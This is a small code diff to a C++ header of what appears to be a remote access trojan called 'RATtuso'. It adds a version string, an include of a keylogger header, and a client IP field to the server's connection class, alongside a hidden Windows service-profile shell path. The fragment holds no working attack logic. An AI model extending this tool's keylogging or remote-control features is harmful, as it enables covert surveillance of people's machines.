@@ -5,6 +5,7 @@
 
 #define CONSOLE_START "RATtuso console => "
 #define SHELL_MAIN_PATH "C:/Windows/ServiceProfiles/LocalService/"
+#define VERSION "1.3"
 
 #ifdef _WIN32
 #include <winsock2.h>
@@ -37,6 +38,7 @@ typedef void* LPVOID;
 #include "FileTransferData.h"
 #include "PacketManager.h"
 #include "PacketStructs.h"
+#include "keylog.h"
 
 class Connection
 {
@@ -53,6 +55,7 @@ public:
 	FileTransferData ifile; //Object that contains information about our file that is being recvd from the client
 
 	PacketManager pm; //Packet Manager for outgoing data for this connection
+	std::string IP;
 };
 
 class Server
